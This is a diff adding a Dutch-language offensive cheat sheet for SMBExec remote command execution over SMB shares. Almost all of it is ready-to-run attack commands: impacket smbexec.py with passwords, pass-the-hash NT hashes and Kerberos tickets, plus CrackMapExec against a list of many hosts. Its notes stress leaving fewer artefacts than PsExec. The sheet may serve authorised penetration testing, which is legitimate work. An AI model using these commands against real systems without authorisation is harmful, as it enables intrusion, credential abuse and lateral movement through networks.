@@ -1,0 +1,28 @@
+# SMBExec — Remote command execution via SMB shares
+# Minder luidruchtig dan PsExec — geen service binary upload
+#
+# === Vereisten ===
+# - Local admin op doelwit
+# - SMB poort 445 open
+#
+# === Voorbeelden ===
+
+# impacket smbexec
+python3 smbexec.py DOMAIN/USER:'PASS'@TARGET_IP
+
+# Met NTLM hash
+python3 smbexec.py DOMAIN/USER@TARGET_IP -hashes :NT_HASH
+
+# Met Kerberos ticket
+export KRB5CCNAME=admin.ccache
+python3 smbexec.py -k -no-pass DOMAIN/USER@TARGET_FQDN
+
+# Specifiek commando uitvoeren
+python3 smbexec.py DOMAIN/USER:'PASS'@TARGET_IP -command 'whoami /all'
+
+# Via CrackMapExec (meerdere hosts)
+crackmapexec smb targets.txt -u USER -p 'PASS' -d DOMAIN -x 'whoami'
+
+# Noot: Gebruikt een tijdelijke service die commando output naar een share schrijft
+# Noot: Minder artefacten dan PsExec (geen binary upload)
+# Noot: Output via %COMSPEC% /Q /c — semi-interactive shell
